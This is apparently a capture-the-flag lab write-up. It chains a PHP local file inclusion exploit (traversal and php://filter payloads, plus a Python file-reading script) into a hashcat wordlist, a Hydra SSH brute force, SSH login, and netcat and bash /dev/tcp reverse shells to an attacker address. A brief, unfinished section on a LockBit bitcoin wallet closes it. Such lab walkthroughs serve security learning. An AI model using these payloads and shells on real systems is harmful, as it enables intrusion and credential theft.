# Local File Inclusion (LFI)

- http://10.10.143.24/index.php?page=../../../etc/passwd
- http://10.10.143.24/index.php?page=home.html../../../etc/passwd
- http://10.10.143.24/index.php?page=....//....//....//etc/passwd

### PHP wrappers
we can use PHP wrappers, also known as PHP stream wrappers


**php://filter/convert.base64-encode/resource=FILE_PATH**              #we can get the content of a file encoded in base64 using this payload

```
curl http://10.10.143.24/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
curl http://10.10.143.24/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd | base64 -d
```

#### Python script to automate this LFI

```
import requests
import base64

while True :
    file = input("[+]File => ")
    response = requests.get(f'http://10.10.143.24/index.php?page=php://filter/convert.base64-encode/resource={file}')
    decoded = base64.b64decode(response.text)
    print(decoded.decode('utf-8'))
```

**Output**
```

└─$ python3 LFI.py

[+]File => /etc/passwd

[+]File => /home/blue/.bash_history

[+]File => /home/blue/.reminder
[REDACTED]                     # sup3r_p@s$w0rd!

#In Attacker Machine
└─$ echo '[REDACTED]' > password.txt

└─$ hashcat --stdout password.txt -r /usr/share/hashcat/rules/best64.rule > passlist.txt
```

### Hydra
```
└─$ hydra -l blue -P passlist.txt  ssh://10.10.143.24
```

### SSH
```
└─$ ssh blue@10.10.143.24

**Gaining a stable connection with the use of pwncat-cs**
> pwncat: pwncat is a post-exploitation platform for Linux targets. It started out as a wrapper around basic bind and reverse shells and has grown from there.
> pwncat used to only support Linux, but there has been a lot of work recently to support multiple platforms.

#### busybox
Running a reverse shell command
```
busybox nc attacker-ip port -e sh
```

**Stable shell gained and flag has been captured**

```
bash -c 'exec bash -i >& /dev/tcp/10.9.1.60/9001 0>&1'

```

> Make sure to run a listener in another terminal to recieve the connection.

# Bitcoin Wallet address or LockBit Ransomware Group 
We can see the terms repeating them after a certain point. Since, we are in search for wallet address. I googled for the size of the address:
But the address we have is more than 62. So, I tried splitting them into two parts:

> [!NOTE]
> bitcoin wallet address size
> A bitcoin address is a 26-62 alphanumeric character identifier that is used to receive bitcoin. There are several address formats based on different specifications.
